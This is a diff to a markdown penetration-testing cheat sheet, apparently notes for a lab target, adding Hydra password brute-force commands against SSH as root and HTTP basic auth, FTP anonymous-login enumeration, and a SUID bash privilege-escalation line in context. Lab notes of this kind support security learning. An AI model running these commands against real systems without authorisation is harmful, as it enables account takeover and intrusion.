@@ -54,3 +54,28 @@ Then on the target:
 ```bash
 /bin/bash -p  # Run with elevated privileges if SUID is set
 ```
+
+### 🛠️ Hydra Brute-Force Examples
+```bash
+# SSH Brute Force
+hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://10.129.54.238
+
+# HTTP Basic Auth Brute Force
+hydra -L users.txt -P passwords.txt 10.129.54.238 http-get /admin
+```
+
+### 📂 FTP Enumeration with Anonymous Login
+```bash
+# Check FTP banner and anonymous login
+ftp 10.129.54.238
+
+# If you see code 230:
+# 230 Login successful.
+# You have access to browse and download/upload if permitted
+
+# Listing files
+ls
+
+# Downloading a file
+get filename.txt
+```
